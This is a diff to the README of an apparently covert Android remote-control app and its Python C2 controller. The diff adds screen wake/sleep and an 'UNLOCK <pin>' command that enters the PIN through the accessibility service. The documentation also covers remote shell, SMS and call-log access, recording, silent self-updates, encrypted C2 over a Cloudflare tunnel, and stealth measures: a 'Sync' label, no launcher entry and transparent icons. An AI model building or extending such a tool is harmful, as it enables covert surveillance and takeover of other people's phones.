@@ -37,7 +37,8 @@ Two channels, both always active when configured:
 | Inbox SMS | `SMSIN [n]` | recent inbox messages from the SMS provider |
 | Remote control | `TAP` `SWIPE` `SETTEXT` `GACTION` | needs accessibility service (see below) |
 | Self-update | `INSTALL <apk>` + `INSTALLSTATUS` | PackageInstaller + accessibility auto-confirm (see below) |
-| Wake screen | `WAKE` | bright wake lock, 10s |
+| Wake / sleep | `WAKE [secs]` / `SLEEP` | bright wake lock (default 10s, max 300s); sleep = keyguard lock via accessibility |
+| PIN unlock | `UNLOCK <pin>` | wake + swipe-up bouncer + accessibility `SET_TEXT` on the PIN field + enter; best-effort, OEM-dependent (needs accessibility) |
 | Volume | `VOL [n\|up\|down\|mute]` | media stream |
 | Clipboard | `CLIPSET <t>` / `CLIPGET` | write works; read restricted since Android 10 |
 | Torch | `TORCH on\|off` | CameraManager torch mode |
@@ -190,10 +191,11 @@ python3 androremote.py <command>
 | `update <apk>` | push + self-install APK update |
 | `all <op...>` / `results` | broadcast to all clients / show all last results |
 | `fastpoll [secs]` | arm low-latency polling on active client |
-| `wake` `vol` `torch` `vibrate` `clipset` `clipget` `apps` `startapp` `notifs` | device controls |
+| `wake [secs]` / `sleep` | screen on (10s default) / lock screen off |
+| `unlock <pin>` | wake + dismiss PIN keyguard (best-effort, needs accessibility) |
+| `vol` `torch` `vibrate` `clipset` `clipget` `apps` `startapp` `notifs` | device controls |
 | `installstatus` | last install result |
 | `axenable` / `axdisable` | enable/disable accessibility + install-unknown-apps appop (adb) |
-| `wake` / `vol [n]` / `torch on\|off` / `vibrate [ms]` | device controls |
 | `clipset <text>` / `clipget` | clipboard write/read |
 | `apps` / `startapp <pkg>` | list / launch apps |
 | `notifs [n]` / `notifsenable` / `notifsdisable` | notification log + listener toggle |
@@ -524,6 +526,6 @@ Bugs fixed during device bring-up: server `do_POST` matched the raw path (query 
 
 ## Verification status
 
-E2E-verified on an Android 15 (API 35) emulator: build chain, install, boot autostart, all 12 original permissions, shell, file round-trips (raw + base64, md5-checked), SMS receive+log, screenshot via adb fallback, C2 over a live Cloudflare tunnel (list/use/ping/shell/put/get/perms/ls/help), and the bug list in Troubleshooting. Stealth round (build-verified, pending on-device re-verify): `Sync` label + no launchable activity confirmed via `aapt2 dump badging`; transparent `ic_launcher` + transparent `ic_notify` small icon compiled into the APK.
+E2E-verified on an Android 15 (API 35) emulator: build chain, install, boot autostart, all 12 original permissions, shell, file round-trips (raw + base64, md5-checked), SMS receive+log, screenshot via adb fallback, C2 over a live Cloudflare tunnel (list/use/ping/shell/put/get/perms/ls/help), and the bug list in Troubleshooting. Stealth round (build-verified, pending on-device re-verify): `Sync` label + no launchable activity confirmed via `aapt2 dump badging`; transparent `ic_launcher` + transparent `ic_notify` small icon compiled into the APK. Wake/sleep/unlock round (build-verified, pending on-device re-verify): `WAKE [secs]` duration arg, `SLEEP` keyguard lock, `UNLOCK <pin>` swipe-up + SET_TEXT keyguard flow compiled in; C2 `/wake` `/sleep` `/unlock` + `androremote adb sleep/unlock <pin>` dispatch live-tested in the REPL.
 
 Not yet exercised on hardware (last change sets): `SMS` send, `CALL`/`CALLLOG` (may be restricted by carrier/MIUI default-dialer rules), `RECORD`, `SWIPE`/`SETTEXT`, self-update chain (`INSTALL` → auto-confirm → restart), `TORCH`/`VOL`/clipboard/notification-listener ops. Compile- and build-verified only. Server-side multi-client, broadcast, pipelining, and the Cloudflare tunnel path are verified live. **Latest round, live-verified:** AES-256-GCM ENC1 round-trips (sessions show `AES-GCM`), wrong-key agent rejected (cannot decrypt commands, times out), TLS listener + cert pin (`--tls`), and cloudflared kill→respawn (~8s, new URL, server kept running).
